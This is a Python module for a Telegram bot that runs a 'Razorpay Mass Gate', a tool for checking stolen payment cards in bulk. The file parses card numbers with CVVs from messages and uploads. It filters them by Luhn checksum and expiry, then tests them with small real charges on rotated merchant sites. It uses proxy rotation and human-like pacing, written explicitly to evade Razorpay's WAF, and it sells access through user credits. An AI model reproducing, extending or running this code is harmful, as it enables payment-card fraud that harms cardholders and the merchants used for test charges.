import asyncio
import re
import time
import random
import os
import json
import itertools
import threading
import urllib.request
import urllib.parse
from datetime import datetime

from aiogram import types, F, Router

from database import is_gate_enabled, get_user_credits, is_owner_user, has_rz_access
from sub import get_premium_status
from mass_gates._batch_common import run_batch_check, handle_result_callback, handle_stop_callback, show_selection
from mass_gates._tg_helpers import safe_reply

router = Router()

# ── Razorpay API (hosted on the VPS, port 9000) ──────────────────────────
RZ_API = os.environ.get("RZ_API", "http://127.0.0.1:9000")
import rz_rotation
SITES_FILE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "rz_site.txt")
MAX_VALID_CARDS = 5000
REGION = "IN"

# module-level state consumed by check_fn (thread-safe rotation via itertools.count)
_sites = []
_proxies = []
_amount_paise = 100  # ₹1 default, overridden per command
_amount_override = None  # amount=X override; else random 50-100 per request
_site_ctr = itertools.count()
_proxy_ctr = itertools.count()


def load_sites():
    try:
        with open(SITES_FILE, encoding="utf-8") as f:
            return [l.strip() for l in f if l.strip().startswith("http")]
    except Exception:
        return []



def _site_key(site):
    k = (site or "").strip().lower().rstrip("/")
    for p in ("http://", "https://"):
        if k.startswith(p):
            k = k[len(p):]
    return k


def _fetch_site_cooldowns() -> set:
    """Query the API for the current site-cooldown set (1h auto-recover)."""
    try:
        with urllib.request.urlopen(f"{RZ_API}/pool-status", timeout=10) as resp:
            data = json.loads(resp.read().decode())
        return {_site_key(e.get("site", "")) for e in data.get("site_cooldown_list", [])}
    except Exception:
        return set()


def luhn_check(card_number):
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    total = 0
    rd = card_number[::-1]
    for i, ch in enumerate(rd):
        d = int(ch)
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return total % 10 == 0


def is_expired(mm, yy):
    try:
        now = datetime.now()
        cy = now.year % 100
        cm = now.month
        ey, em = int(yy), int(mm)
        if ey < cy:
            return True
        if ey == cy and em < cm:
            return True
        return False
    except ValueError:
        return True


def extract_cards(text):
    pattern = r'(\d{13,19})\s*[|/\\:\s]\s*(\d{1,2})\s*[|/\\:\s]\s*(\d{2,4})\s*[|/\\:\s]\s*(\d{3,4})'
    cards = []
    for m in re.findall(pattern, text):
        cc, mm, yy, cvv = m
        mm = mm.zfill(2)
        if len(yy) == 4:
            yy = yy[2:]
        cards.append(f"{cc}|{mm}|{yy}|{cvv}")
    return cards


_bad_sites = set()  # sites that returned "Amount too small" (min > ₹100)

# A: per-site velocity cap — sites exhaust at ~10 checks ("server error"), so
# cap each site at 5 checks per window and rotate. Tighter than the IP cap.
MAX_CHECKS_PER_SITE = 5
SITE_PAUSE_SECONDS = 60  # 1 min
# B: a site that returns "server error" goes to cooldown for 5 min (time-based).
SITE_DEAD_COOLDOWN_SECONDS = 300  # 5 min
_site_uses = {}
_site_paused_until = {}
_site_dead_until = {}
_site_guard = threading.Lock()


def _record_site_use(site):
    with _site_guard:
        key = _site_key(site)
        uses = _site_uses.get(key, 0) + 1
        _site_uses[key] = uses
        if uses >= MAX_CHECKS_PER_SITE:
            _site_paused_until[key] = time.time() + SITE_PAUSE_SECONDS
            _site_uses[key] = 0


def _site_available(site):
    key = _site_key(site)
    with _site_guard:
        if key in _bad_sites:
            return False
        if time.time() < _site_dead_until.get(key, 0):
            return False  # in "server error" cooldown (5 min)
        return time.time() >= _site_paused_until.get(key, 0)


def _next_site():
    global _sites
    if not _sites:
        _sites = load_sites()
    if not _sites:
        return None
    n = len(_sites)
    for _ in range(n):
        site = _sites[next(_site_ctr) % n]
        if _site_available(site):
            return site
    return None


_proxy_locks = {}
_proxy_locks_guard = threading.Lock()

# per-proxy lifetime cap: 5 checks -> random 1-3 min pause (human-like cadence)
MAX_PROXY_USES = 5
_proxy_uses = {}
_proxy_paused_until = {}
_proxy_uses_guard = threading.Lock()


def _record_proxy_use(proxy):
    with _proxy_uses_guard:
        uses = _proxy_uses.get(proxy, 0) + 1
        if uses >= MAX_PROXY_USES:
            pause = random.randint(60, 180)  # 1-3 min
            _proxy_paused_until[proxy] = time.time() + pause
            _proxy_uses[proxy] = 0
        else:
            _proxy_uses[proxy] = uses


def _proxy_usable(proxy):
    with _proxy_uses_guard:
        return time.time() >= _proxy_paused_until.get(proxy, 0)


def _next_proxy():
    global _proxies
    if not _proxies:
        return None
    return _proxies[next(_proxy_ctr) % len(_proxies)]


def _proxy_lock(proxy):
    with _proxy_locks_guard:
        if proxy not in _proxy_locks:
            _proxy_locks[proxy] = threading.Lock()
        return _proxy_locks[proxy]


def _acquire_free_proxy():
    """Pick a proxy that is NOT currently in-flight. 1 request per IP keeps
    Razorpay's WAF from 403-ing on concurrent bursts from a single exit."""
    global _proxies
    n = len(_proxies)
    if n == 0:
        return None, None
    for _ in range(n):
        candidate = _proxies[next(_proxy_ctr) % n]
        if not _proxy_usable(candidate):
            continue
        lock = _proxy_lock(candidate)
        if lock.acquire(blocking=False):
            return candidate, lock
    candidate = _proxies[next(_proxy_ctr) % n]
    lock = _proxy_lock(candidate)
    lock.acquire()
    return candidate, lock


def check_fn(card):
    """Sync single-card check against the Razorpay API (VPS:9000).
    Returns (status, msg, brand, amount_inr) — amount_inr is the actual charge."""
    site = _next_site()
    if not site:
        return "ERROR", "No sites loaded (rz_site.txt empty)", "UNKNOWN", 0
    proxy, lock = _acquire_free_proxy()
    if proxy is None:
        return "ERROR", "No proxies loaded", "UNKNOWN", 0
    try:
        amount = _amount_override or random.randint(5000, 10000)  # ₹50-100
        q = urllib.parse.urlencode({
            "cc": card,
            "site": site,
            "proxy": proxy,
            "amount": amount,
            "region": REGION,
        })
        url = f"{RZ_API}/razorpay?{q}"
        try:
            resp = urllib.request.urlopen(url, timeout=180)
            data = json.loads(resp.read().decode())
        except Exception as e:
            return "ERROR", f"API: {str(e)[:80]}", "UNKNOWN", 0
        status = str(data.get("status") or "error").lower()
        msg = data.get("message") or data.get("reason") or "N/A"
        m = (msg or "").lower()
        actual_paise = int(data.get("amount_paise") or amount)
        amount_inr = actual_paise / 100
        # site fixed price above ₹100 -> unusable for checking, skip it
        if "amount too small" in m or actual_paise > 10000:
            _bad_sites.add(_site_key(site))
        if "server error" in m or "site issue" in m:
            with _site_guard:
                _site_dead_until[_site_key(site)] = time.time() + SITE_DEAD_COOLDOWN_SECONDS

        if actual_paise > 10000:
            return "ERROR", f"Amount too high (₹{amount_inr:.0f}) — site skipped", "UNKNOWN", amount_inr
        if status == "charged":
            return "CHARGED", msg, "CHARGED", amount_inr
        if status == "approved":
            return "APPROVED", msg, "APPROVED", amount_inr
        if "3ds" in m or "3d secure" in m or "3-d secure" in m:
            return "3DS", msg, "3DS", amount_inr
        if status == "dead":
            return "DECLINED", msg, "UNKNOWN", amount_inr
        return "ERROR", msg, "UNKNOWN", amount_inr
    finally:
        _record_site_use(site)
        _record_proxy_use(proxy)
        lock.release()


@router.message(F.text.startswith("/mrz") | F.caption.startswith("/mrz"))
async def mrz_command(message: types.Message):
    global _amount_paise, _proxies, _sites

    if not await asyncio.to_thread(is_gate_enabled, "mrz"):
        await safe_reply(message, "🚧 <b>𝗥𝗮𝘇𝗼𝗿𝗽𝗮𝘆 𝗠𝗮𝘀𝘀 𝗚𝗮𝘁𝗲 𝘂𝗻𝗱𝗲𝗿 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲.</b>", parse_mode="HTML")
        return

    user = message.from_user
    user_id = user.id

    if not await asyncio.to_thread(has_rz_access, user_id):
        await safe_reply(message,
            "🔒 <b>𝗥𝗮𝘇𝗼𝗿𝗽𝗮𝘆 𝗔𝗰𝗰𝗲𝘀𝘀 𝗥𝗲𝗾𝘂𝗶𝗿𝗲𝗱</b>\n\n"
            "𝗬𝗼𝘂 𝗱𝗼𝗻'𝘁 𝗵𝗮𝘃𝗲 𝗮𝗰𝗰𝗲𝘀𝘀 𝘁𝗼 𝘁𝗵𝗲 𝗥𝗮𝘇𝗼𝗿𝗽𝗮𝘆 𝗴𝗮𝘁𝗲.\n"
            "𝗢𝗻𝗹𝘆 𝘁𝗵𝗲 𝗱𝗲𝘃 𝗰𝗮𝗻 𝗴𝗿𝗮𝗻𝘁 𝗶𝘁.",
            parse_mode="HTML")
        return

    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)

    raw_text = ""
    cmd_text = message.text or message.caption or ""
    parts = cmd_text.split(maxsplit=1)
    if len(parts) > 1:
        raw_text += parts[1] + " "
    if message.reply_to_message:
        rm = message.reply_to_message
        if rm.text:
            raw_text += rm.text + " "
        elif rm.caption:
            raw_text += rm.caption + " "

    document = message.document
    if not document and message.reply_to_message:
        document = message.reply_to_message.document
    if document:
        try:
            fi = await message.bot.get_file(document.file_id)
            data = await message.bot.download_file(fi.file_path)
            raw_text += data.read().decode('utf-8', errors='ignore')
        except Exception as e:
            await safe_reply(message, f"❌ Error reading file: {e}")
            return

    # amount override: amount=X (rupees) — else random ₹50–₹100
    global _amount_override
    amt_match = re.search(r'amount\s*=\s*(\d+)', raw_text, re.I)
    if amt_match:
        _amount_override = min(int(amt_match.group(1)), 100) * 100  # cap ₹100
        _amount_paise = _amount_override
        raw_text = raw_text[:amt_match.start()] + " " + raw_text[amt_match.end():]
    else:
        _amount_override = None
        _amount_paise = None

    if not raw_text.strip():
        await safe_reply(message,
            "❌ <b>𝗡𝗼 𝗰𝗮𝗿𝗱𝘀 𝗳𝗼𝘂𝗻𝗱.</b>\n\n"
            "• <code>/mrz cc|mm|yy|cvv</code>\n"
            "• Reply to cards with <code>/mrz</code>\n"
            "• Send .txt file with <code>/mrz</code>\n"
            "• Add <code>amount=75</code> to override amount",
            parse_mode="HTML")
        return

    extracted = extract_cards(raw_text)
    valid = []
    for c in extracted:
        cc, mm, yy, cvv = c.split('|')
        if luhn_check(cc) and not is_expired(mm, yy):
            valid.append(c)
        if len(valid) >= MAX_VALID_CARDS:
            break

    if not valid:
        await safe_reply(message, "❌ No valid cards to check.", parse_mode="HTML")
        return

    _proxies = rz_rotation.refresh_proxies()
    if not _proxies:
        await safe_reply(message, "⚠️ <b>𝗡𝗼 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 𝗶𝗻 𝗿𝘇_𝗽𝘅𝘆.𝘁𝘅𝘁!</b>\n\n𝗔𝗱𝗱 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 𝘁𝗼 <code>rz_pxy.txt</code> (𝗼𝗻𝗲 𝗽𝗲𝗿 𝗹𝗶𝗻𝗲).", parse_mode="HTML")
        return
    _sites = load_sites()
    # skip sites currently in cooldown (1h after "site issue")
    try:
        _site_cd = _fetch_site_cooldowns()
        if _site_cd:
            _sites = [s for s in _sites if _site_key(s) not in _site_cd]
    except Exception:
        pass

    total = len(valid)
    current_credits = await asyncio.to_thread(get_user_credits, user_id)
    if current_credits < total:
        await safe_reply(message,
            f"❌ <b>𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗖𝗿𝗲𝗱𝗶𝘁𝘀</b>\n\n"
            f"You need <b>{total}</b> credits to check <b>{total}</b> cards.\n"
            f"Your balance: <b>{current_credits}</b> credits.",
            parse_mode="HTML")
        return

    plan_name = "OWNER" if is_owner_user(user_id) else ("PREMIUM" if is_premium else "FREE")

    await show_selection(message, valid, check_fn, f"𝐑𝐚𝐳𝐨𝐫𝐩𝐚𝐲 𝐌𝐚𝐬𝐬 (₹{_amount_override // 100})" if _amount_override else "𝐑𝐚𝐳𝐨𝐫𝐩𝐚𝐲 𝐌𝐚𝐬𝐬 (₹50-100)", user_id, user, "mrz", plan_name)


@router.callback_query(F.data.startswith("mrz_res_"))
async def mrz_result_handler(callback: types.CallbackQuery):
    await handle_result_callback(callback)


@router.callback_query(F.data.startswith("mrz_stop_"))
async def mrz_stop_handler(callback: types.CallbackQuery):
    await handle_stop_callback(callback)
